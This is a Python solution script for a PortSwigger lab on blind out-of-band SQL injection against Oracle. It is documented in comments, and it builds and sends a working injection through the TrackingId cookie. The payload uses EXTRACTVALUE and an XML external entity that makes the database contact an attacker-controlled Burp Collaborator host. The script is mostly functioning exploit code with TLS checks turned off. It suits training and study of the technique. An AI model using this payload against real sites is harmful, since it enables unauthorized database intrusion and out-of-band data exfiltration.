# Lab 16 — Blind SQL Injection: Out-of-Band Interaction
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
#
# Vulnerability: TrackingId cookie (query runs asynchronously)
# Aim:           Trigger a DNS lookup to Burp Collaborator
#
# DB: Oracle
#
# Why OOB?
#   The query runs asynchronously — the HTTP response arrives before the DB
#   finishes executing. No content change, no error, no timing signal.
#   The only channel left is outbound network traffic from the DB server itself.
#
# Technique:
#   EXTRACTVALUE + XML external entity forces Oracle to resolve a URL.
#   The XML DOCTYPE declares an external entity pointing to our Collaborator domain.
#   When Oracle parses the XML it performs a DNS lookup — Collaborator catches it.
#
# Requires: Burp Suite Pro — update COLLABORATOR_DOMAIN before running.
#
# Usage: python lab16.py <url>

import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.burpcollaborator.net"
# ────────────────────────────────────────────────────────────────────────────


def build_payload(tracking_id, collab_domain):
    """
    Build the Oracle XXE payload that triggers an outbound DNS lookup.

    The XML string uses double quotes for attributes (valid XML) and is wrapped
    in single quotes for the SQL string literal — no quote conflict.

    Resulting cookie value sent to the server:
      <tracking_id>' UNION SELECT EXTRACTVALUE(xmltype('<?xml ...SYSTEM "http://collab/"...>'),'/l') FROM dual--
    """
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE root [ '
        f'<!ENTITY % remote SYSTEM "http://{collab_domain}/"> '
        '%remote;]>'
    )
    return f"' UNION SELECT EXTRACTVALUE(xmltype('{xml}'),'/l') FROM dual--"


if __name__ == "__main__":
    banner()
    section("LAB 16 — BLIND SQLi: OOB DNS INTERACTION (ORACLE)")

    if len(sys.argv) != 2:
        print("  Usage: python lab16.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.burpcollaborator.net":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    payload = build_payload(tracking_id, COLLABORATOR_DOMAIN)
    print(f"\n  ➜  Sending OOB payload to: {COLLABORATOR_DOMAIN}\n")

    session.get(url, cookies={"TrackingId": payload})

    print("  ✔  Payload sent.")
    print("  ➜  Open Burp Collaborator → click 'Poll now' → look for DNS interaction.")
